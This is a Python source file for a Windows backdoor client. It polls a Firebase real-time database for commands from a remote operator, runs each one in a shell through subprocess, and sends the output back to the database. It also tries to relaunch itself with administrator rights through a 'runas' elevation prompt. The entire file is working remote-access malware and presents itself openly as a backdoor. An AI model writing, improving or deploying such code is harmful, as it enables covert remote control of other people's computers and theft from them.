import subprocess
import pyrebase
import sys, ctypes
import Configs


class Client:
    """
    Creates a continuous connection with a host using firebase to
    transfer input and output strings.
    """
    def __init__(self):
        # Firebase WebApp config
        self.config = Configs.config

        # Initialize Pyrebase App
        self.app = pyrebase.initialize_app(self.config)

        # Establishes a connection with the database
        # EXAMPLE FIREBASE REAL TIME DATABASE(RTDB)::
        #
        # Default-Firebase-RTDB:
        # |__ 'output' : 'N/A'
        # |__ 'input' : 'N/A'
        #
        self.shell = self.app.database()

    def is_admin(self):
        """
        Checks if the current user is admin
        """
        try:
            return ctypes.windll.shell32.IsUserAdmin
        except:
            return True

    def connect(self):
        """
        Initialize the backdoor loop
        """
        # Check that the user is admin. If they aren't, ask for admin permissions and reopen the application as admin.
        if self.is_admin():
            # Start the backdoor
            while True:
                # Check if the host has updated the 'input' value in the database
                input_ = str(self.shell.child('input').get().val()).split(' ')

                # If there is available input from the host, and the input is not closing the connection
                if 'N/A' not in input_ and ':KILL' not in input_:
                    # Execute the input as shell code and store its value in 'output'
                    output = self.execute_input_as_shell(input_)

                    # send 'output' to the database
                    self.send_output(output)

                # Else if the input is closing the connection
                elif ':KILL' in input_:
                    # Break the loop
                    break
        else:
            # 'sys.argv' should become 'sys.argv[1:]' before converting to an executable
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)

    def execute_input_as_shell(self, input_):
        """
        Executes 'input_' as shell code and returns the output as a string
        """
        # Execute the input as shell code
        try:
            command = subprocess.run(input_, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            # Return the output of the shell code as a string
            return command.stdout.decode("utf-8")
        except FileNotFoundError:
            # This error still needs more testing to understand the reason for the error
            # If it is detected, it will reset the input and output values stored in the database
            self.shell.update({'input': 'N/A',
                               'output': 'N/A'})

    def send_output(self, output):
        """
        Updates the input and output values in the database. Setting 'output'
        to reflect the output of the shell code and setting the 'input' to None
        """
        # Send Output to database
        self.shell.update({'input': 'N/A',
                           'output': output})


if __name__ == '__main__':
    c = Client()
    c.connect()
